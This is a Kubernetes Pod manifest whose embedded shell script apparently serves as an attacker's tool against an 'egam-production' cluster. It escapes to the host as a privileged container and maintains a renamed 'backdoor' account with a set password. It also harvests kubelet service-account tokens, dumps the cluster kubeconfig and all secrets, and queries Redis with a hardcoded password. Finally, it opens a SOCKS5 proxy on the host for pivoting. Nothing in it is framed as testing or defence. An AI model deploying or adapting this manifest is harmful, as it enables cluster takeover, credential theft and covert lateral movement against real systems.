
apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache util-linux curl jq redis openssh-client openssh-server > /dev/null 2>&1

        echo "=========================================="
        echo "=== 1. RENAME BACKDOOR TO EGAMS ==="
        echo "=========================================="
        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
          usermod -l egams backdoor 2>/dev/null || true
          usermod -d /home/egams -m egams 2>/dev/null || true
          echo "egams:P@ssw0rd2026!" | chpasswd 2>/dev/null || true
          echo "=== NEW USER ==="
          id egams 2>/dev/null || true
        ' 2>&1 || true

        echo "=========================================="
        echo "=== 2. ALL KUBELET TOKENS WITH SA NAME ==="
        echo "=========================================="
        find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | while read f; do
          token=$(cat "$f" 2>/dev/null)
          payload=$(echo "$token" | cut -d. -f2)
          decoded=$(echo "$payload" | tr '_-' '/+' | base64 -d 2>/dev/null)
          sa=$(echo "$decoded" | jq -r '.kubernetes.io.serviceaccount.name // "unknown"' 2>/dev/null)
          pod=$(echo "$decoded" | jq -r '.kubernetes.io.pod.name // "unknown"' 2>/dev/null)
          ns=$(echo "$decoded" | jq -r '.kubernetes.io.namespace // "unknown"' 2>/dev/null)
          exp=$(echo "$decoded" | jq -r '.exp // 0' 2>/dev/null)
          echo "FILE: $f"
          echo "  NAMESPACE: $ns"
          echo "  POD: $pod"
          echo "  SERVICE_ACCOUNT: $sa"
          echo "  EXPIRES: $exp"
          echo "  TOKEN_PREFIX: $(echo $token | head -c 60)..."
          echo ""
        done

        echo "=========================================="
        echo "=== 3. KUBECONFIG (full) ==="
        echo "=========================================="
        cat /host/etc/rancher/rke2/rke2.yaml 2>/dev/null || cat /host/etc/rancher/k3s/k3s.yaml 2>/dev/null || echo "NOT FOUND"

        echo "=========================================="
        echo "=== 4. REDIS ==="
        echo "=========================================="
        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP INFO 2>&1 | head -30 || true
        echo "--- KEYS ---"
        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP KEYS '*' 2>&1 | head -20 || true

        echo "=========================================="
        echo "=== 5. KUBERNETES SECRETS ==="
        echo "=========================================="
        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
        chmod +x kubectl
        mv kubectl /usr/local/bin/ 2>/dev/null || true
        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
        kubectl get secrets -A 2>&1 | head -50 || true
        echo "--- PODS ---"
        kubectl get pods -A 2>&1 | head -50 || true

        echo "=========================================="
        echo "=== 6. START SOCKS5 PROXY ON :1080 ==="
        echo "=========================================="
        # Installa microsocks (proxy SOCKS5 leggero)
        apk add --no-cache microsocks > /dev/null 2>&1 || true
        # Avvia il proxy
        microsocks -p 1080 -i 0.0.0.0 &
        echo "[*] SOCKS5 proxy started on 0.0.0.0:1080"
        echo "[*] IP del pod: $(hostname -i)"
        echo "[*] Usa: ssh -D 1080 -N -f -p 22 root@172.30.0.15 (con password)"
        echo "[*] Oppure: proxychains redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP"

        echo "=========================================="
        echo "=== DONE ==="
        echo "=========================================="
        sleep 36000
    securityContext:
      privileged: true
    ports:
    - containerPort: 1080
      hostPort: 1080
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
